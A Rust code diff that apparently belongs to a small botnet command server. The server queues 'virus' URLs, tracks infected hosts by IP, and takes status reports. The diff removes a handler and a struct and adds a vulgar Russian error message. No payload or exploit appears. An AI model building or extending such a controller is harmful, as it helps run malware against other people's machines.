@@ -7,12 +7,6 @@ use serde::{Deserialize, Serialize};
 use std::{collections::HashMap, sync::Arc};
 use tokio::sync::Mutex;
 
-#[allow(dead_code)]
-struct Diddy {
-    ip: String,
-    ping: u64,
-}
-
 #[derive(Clone, Serialize, Deserialize)]
 struct Virus {
     id: u64,
@@ -37,17 +31,9 @@ async fn add_virus(botnetstate: &Arc<BotnetState>, url: &str) {
     que.sort_by_key(|virus| virus.id);
 }
 
-async fn add_virus_handler(
-    State(state): State<Arc<BotnetState>>,
-    Json(url): Json<String>,
-) -> String {
-    add_virus(&state, &url).await;
-    format!("virus {url} pushed, status: edging")
-}
-
 struct BotnetState {
     que: Mutex<Vec<Virus>>,
-    pro: Mutex<HashMap<Diddy, u64>>,
+    pro: Mutex<HashMap<String, u64>>, // ip -> id вируса
 }
 
 #[tokio::main]
@@ -88,10 +74,9 @@ async fn virus_status_handler(
 ) -> String {
     let mut que = state.que.lock().await;
     match body.status.as_str() {
-        // blocking virus
         "cooked" => set_virus_result(&mut que, &body),
         "fifty" => set_virus_result(&mut que, &body),
-        unknown => format!("virus {}: unknown status {unknown}", body.id),
+        unknown => format!("virus {}: прислал хуйню {unknown}", body.id),
     }
 }
 
